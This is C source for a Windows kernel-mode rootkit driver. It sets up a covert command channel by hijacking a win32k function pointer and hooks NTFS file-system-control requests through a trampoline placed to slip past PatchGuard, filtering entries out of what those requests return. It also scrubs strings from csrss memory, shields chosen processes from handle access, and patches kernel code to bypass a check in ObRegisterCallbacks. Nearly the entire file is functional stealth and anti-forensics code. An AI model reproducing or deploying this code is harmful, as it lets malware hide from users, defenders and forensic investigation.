#include "imports.h"
#include "structs.h"
#include "util.h"
#include "exe.h"

ULONG64(__fastcall* OriginalFunction)(ULONG64, ULONG64, ULONG64, ULONG64);
ULONG64 dataPtrAddy;


typedef struct _Command {
	BYTE action;
	ULONG64 param1;
	ULONG64 param2;
	ULONG64 param3;
} COMMAND, * PCOMMAND;

const BYTE HEARTBEAT = 0x10;
const BYTE NTFS_FILTER_ADD = 0x20;
const BYTE NTFS_FILTER_REMOVE = 0x30;
const BYTE CSRSS_STRING_REMOVE = 0x40;
const BYTE PROTECT_PROCESS = 0x50;
const BYTE UNPROTECT_PROCESS = 0x60;

ULONG64 __fastcall hookedFunc(ULONG64 p1, ULONG64 p2, ULONG64 p3, ULONG64 p4) {
	if (p3 == 0xa11baba) {
		DbgPrintEx(0,0,"%llX %llX %llX %llX\n",p1,p2,p3,p4);
		ULONG64 address = p1;
		COMMAND c = { 0 };
		NTSTATUS result = CVM((PVOID)address, &c, sizeof(COMMAND));
		DbgPrintEx(0,0,"  -> %llX %llX %llX %llX\n",(ULONG64)c.action,c.param1,c.param2,c.param3);
		if (result == STATUS_SUCCESS) {
			if (c.action == HEARTBEAT) {
				c.param2 = 1;
				c.param3 = c.param1;
			} else if (c.action == NTFS_FILTER_ADD) {
				wchar_t* p = (wchar_t*)ExAllocatePool(NonPagedPool, c.param1);
				if (p != 0) {
					CVM((PVOID)c.param2, p, c.param1);
					c.param3 = addToFilterList(p,c.param1);
					dbgFilterList();
				}
				else {
					DbgPrintEx(0,0,"Couldn't alloc for string (add)");
				}
			} else if (c.action == NTFS_FILTER_REMOVE) {
				wchar_t* p = (wchar_t*)ExAllocatePool(NonPagedPool, c.param1);
				if (p != 0) {
					CVM((PVOID)c.param2, p, c.param1);
					c.param3 = removeFromFilterList(p, c.param1);
					dbgFilterList();
					ExFreePool(p);
				} else {
					DbgPrintEx(0, 0, "Couldn't alloc for string (remove)");
				}
			} else if (c.action == CSRSS_STRING_REMOVE) {
				wchar_t* p = (wchar_t*)ExAllocatePool(NonPagedPool, c.param1);
				if (p != 0) {
					CVM((PVOID)c.param2, p, c.param1);
					c.param3 = removeStringCsrss(p,c.param1);
					ExFreePool(p);
				} else {
					DbgPrintEx(0, 0, "Couldn't alloc for string (csrss)");
				}
			} else if (c.action == PROTECT_PROCESS) {
				ULONG64 pid = c.param1;
				c.param3 = addToProtectedProcesses(pid);
			} else if (c.action == UNPROTECT_PROCESS) {
				ULONG64 pid = c.param1;
				c.param3 = removeFromProtectedProcesses(pid);
			}
			CVM(&c, (PVOID)address, sizeof(COMMAND));
			return 0x12345;
		}
	}
	return OriginalFunction(p1,p2,p3,p4);
}

typedef INT64(__fastcall* NtfsFsdFileSystemControl_t)(PDEVICE_OBJECT pd, PIRP pirp);
NtfsFsdFileSystemControl_t NtfsFsdFileSystemControl;
BYTE jumpSC[] = { 0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }; //jmp QWORD PTR [rip+0x0]
INT64 __fastcall NtfsFsdFileSystemControlHooked(PDEVICE_OBJECT pd, PIRP pirp) {
	IO_STACK_LOCATION* CurrentStackLocation = pirp->Tail.Overlay.CurrentStackLocation;
	ULONG LowPart = CurrentStackLocation->Parameters.Read.ByteOffset.LowPart;
	

	if (LowPart == 0x900bb &&pirp->RequestorMode == UserMode) { //If this is a read
		PVOID address = pirp->UserBuffer;
		ULONG64 outputLen = (ULONG64)CurrentStackLocation->Parameters.FileSystemControl.OutputBufferLength;

		PVOID dBuf = ExAllocatePool(NonPagedPool, outputLen);

		if (dBuf == 0) {
			return NtfsFsdFileSystemControl(pd, pirp);
		}



		pirp->UserBuffer = dBuf;
		pirp->RequestorMode = KernelMode; //We are outputting to a kernel buffer so we have to mark this as a kernel call
		
		INT64 rv = NtfsFsdFileSystemControl(pd, pirp);
		ULONG64 writtenBytes = pirp->IoStatus.Information;
		if (writtenBytes <= outputLen) { //Sanity check cuz i saw some suspicious stuff when debugging....
			pirp->IoStatus.Information = sanitizeBuffer(dBuf, writtenBytes);
			//Change the amount that is written out to the buffer
		}
		CVM(dBuf, address, outputLen);
		ExFreePool(dBuf);

		return rv;
	};
	return NtfsFsdFileSystemControl(pd, pirp);
}

OB_PREOP_CALLBACK_STATUS PobPreOperationCallback(PVOID RegistrationContext,POB_PRE_OPERATION_INFORMATION OperationInformation) {
	RegistrationContext;
	OperationInformation;
	CHEBPROCESS* proc = (CHEBPROCESS*)OperationInformation->Object;
	if (PsGetCurrentProcess() != PsInitialSystemProcess && isProcProtected(proc)) {
		OperationInformation->Parameters->CreateHandleInformation.DesiredAccess = (0x00100000 | 0x1000); //SYNCHRONIZE | PROCESS_QUERY_LIMITED_INFORMATION 
		DbgPrintEx(0, 0, "Protected process %llX\n", proc->UniqueProcessID);
	}
	return OB_PREOP_SUCCESS;
}

NTSTATUS DriverEntry(PVOID a, PVOID b) {
	a;b;

	//Communication setup
	ULONG64 base = GetKernelBase(); //Get ntoskrnl base address
	if (base == 0) {
		DbgPrintEx(0, 0, "Failed to find ntoskrnl base\n");
		return 1;
	}
	DbgPrintEx(0,0,"Ntoskrnl base %llX\n",base);
	PsLoadedModuleList = (PLIST_ENTRY) * (ULONG64*)(base + ntosPsLoadedModuleListAddressOffset); //Get PsLoadedModuleList
	PKLDR_DATA_TABLE_ENTRY ntoskrnlModule = (PKLDR_DATA_TABLE_ENTRY)PsLoadedModuleList->Flink; //Use PsLoadedModuleList to get ntoskrnl entry
	if (base != ntoskrnlModule->DllBase) { //Just a sanity check
		DbgPrintEx(0, 0, "Something went wrong, maybe ntos2PsLoadedModuleList is wrong?\n");
		return 1;
	}

	PKLDR_DATA_TABLE_ENTRY win32kModule = findModule(ntoskrnlModule, 20, L"win32k.sys");

	if (win32kModule == 0) {
		DbgPrintEx(0, 0, "Couldn't find win32k.sys\n");
		return 1;
	}

	ULONG64 NtUserCheckProcessForClipboardAccessAddress = ScanPattern(win32kModule->DllBase, win32kModule->SizeOfImage, 18, "\x48\x8b\x05\x00\x00\x00\x00\x48\x85\xc0\x74\x06\xff\x15\xea\xfa\x06\x00", "xxx???xxxxxxxxxxxx"); // NtUserCheckProcessForClipboardAccess

	if (NtUserCheckProcessForClipboardAccessAddress == 0) {
		DbgPrintEx(0, 0, "Couldn't find NtUserCheckProcessForClipboardAccess\n");
		return 1;
	}

	ULONG64 qwordAddress = NtUserCheckProcessForClipboardAccessAddress + *(ULONG32*)(NtUserCheckProcessForClipboardAccessAddress + 3) + 7;

	*(PVOID*)&OriginalFunction = InterlockedExchangePointer((PVOID*)qwordAddress, (PVOID)hookedFunc);
	//Communication setup done
	
	//Hook NtfsFsdFileSystemControl IOCTL
	PKLDR_DATA_TABLE_ENTRY ntfsModule = findModule(ntoskrnlModule, 16, L"Ntfs.sys");

	if (ntfsModule==0) {
		DbgPrintEx(0, 0, "Couldn't find Ntfs.sys\n");
		return 1;
	}

	UNICODE_STRING name = {0};
	RtlInitUnicodeString(&name, L"\\Ntfs");

	HANDLE h = 0;
	OBJECT_ATTRIBUTES oa = {0};
	InitializeObjectAttributes(&oa, &name, OBJ_KERNEL_HANDLE, NULL, NULL);
	IO_STATUS_BLOCK out = {0};
	NTSTATUS nt = ZwOpenFile(&h, GENERIC_READ | GENERIC_WRITE, &oa, &out, FILE_SHARE_READ | FILE_SHARE_WRITE, 0);

	if (!NT_SUCCESS(nt)) {
		DbgPrintEx(0, 0, "Couldn't open file! %lx\n",nt);
		return 1;
	}

	PDRIVER_OBJECT dao;
	nt = ObReferenceObjectByHandle(h, GENERIC_READ, 0 ,KernelMode,(PVOID*)&dao,0);
	ObCloseHandle(h,KernelMode);
	if (!NT_SUCCESS(nt)) {
		DbgPrintEx(0, 0, "Couldn't ref obj! %lx %llX\n", nt, (ULONG64)h);
		return 1;
	}

	dao = dao->DeviceObject->DriverObject;
	NtfsFsdFileSystemControl = (NtfsFsdFileSystemControl_t)dao->MajorFunction[13];

	//PatchGuard does a location check on these major functions so they have to point somewhere in the correct module

	ULONG64 padFunAddress = ntfsModule->DllBase + 0x65860; // 0x65800-0x66000 is padding right after .text

	
	*(ULONG64*)(((ULONG64)&jumpSC) + 6) = (ULONG64)&NtfsFsdFileSystemControlHooked;

	writeReadonly((void*)padFunAddress, &jumpSC, 14);

	dao->MajorFunction[13] = (PDRIVER_DISPATCH)padFunAddress;
	//Done hooking NtfsFsdFileSystemControl 

	//Register callback for handle opening to a process

	OB_OPERATION_REGISTRATION opReg = { 0 };
	opReg.ObjectType = PsProcessType;
	opReg.Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE;
	opReg.PreOperation = (POB_PRE_OPERATION_CALLBACK)&PobPreOperationCallback;

	OB_CALLBACK_REGISTRATION reg = {0};
	reg.Version = ObGetFilterVersion();
	reg.OperationRegistrationCount = 1;
	RtlInitUnicodeString(&reg.Altitude, L"23256");
	reg.OperationRegistration = &opReg;
	reg.RegistrationContext = 0;

	PVOID regHandle = 0;
	//ObRegisterCallbacks will prevent us from registering a callback in an "invalid" location. (so lets do a .text patch to remove the check)
	ULONG64 approxLoc = (ULONG64)ObRegisterCallbacks;
	ULONG64 addy = ScanPattern(approxLoc, ntoskrnlModule->SizeOfImage - (approxLoc - ntoskrnlModule->DllBase), 14, "\xBA\x20\x00\x00\x00\xE8\xCC\xCC\xCC\xCC\x85\xC0\x0F\x84", "xxxxxx????xxxx");
	if (addy != 0) {
		addy += 5;

		BYTE orig[5];
		BYTE movEax1[] = { 0xB8, 0x01, 0x00, 0x00, 0x00 }; //Overwrite call 
		memcpy(orig, (void*)addy, 5);
		writeReadonly((void*)addy, movEax1, 5);
		NTSTATUS result = ObRegisterCallbacks(&reg, &regHandle);
		writeReadonly((void*)addy, orig, 5);
		if (!NT_SUCCESS(result)) {
			DbgPrintEx(0,0,"Couldn't create handle callback :(");
		}
	}
	else {
		DbgPrintEx(0,0,"Couldn't find ObRegisterCallbacks callback check!\n");
	}
	//Done registering callback

	return STATUS_SUCCESS;
}
